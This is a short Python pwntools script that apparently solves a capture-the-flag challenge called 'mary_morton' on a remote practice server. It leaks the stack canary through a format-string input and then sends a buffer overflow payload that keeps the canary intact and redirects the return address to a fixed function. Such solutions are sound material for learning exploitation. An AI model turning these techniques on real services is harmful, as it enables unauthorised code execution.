from pwn import *
from LibcSearcher import LibcSearcher
import binascii

file_crack = './mary_morton'
context(os='linux', arch='i386', log_level='debug')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

elf = ELF(file_crack)
#n = process('./mary_morton')
n = remote('111.198.29.45', 31569)
# gdb.attach(n)

# get cannary by fmt_str
n.sendline('2')
n.sendline('AAAAAAAA%23$lx')
els = n.recvuntil('AAAAAAAA')
ch = n.recvuntil('00')
log.info(ch)
cannary = int(ch, 16)
log.info(hex(cannary))

# overflow it!
n.sendline('1')
payload = 136*'a' + p64(cannary) + 'aaaaaaaa' + p64(0x00000000004008DA)
n.sendline(payload)
sleep(1)
n.recv()
n.recv()



# n.sendline('2')
# n.sendline('AAAA%38$x')
# n.sendline('2')
# n.sendline('AAAA%39$x')
# n.sendline('2')
# n.sendline('AAAA%40$X')
# n.recv()
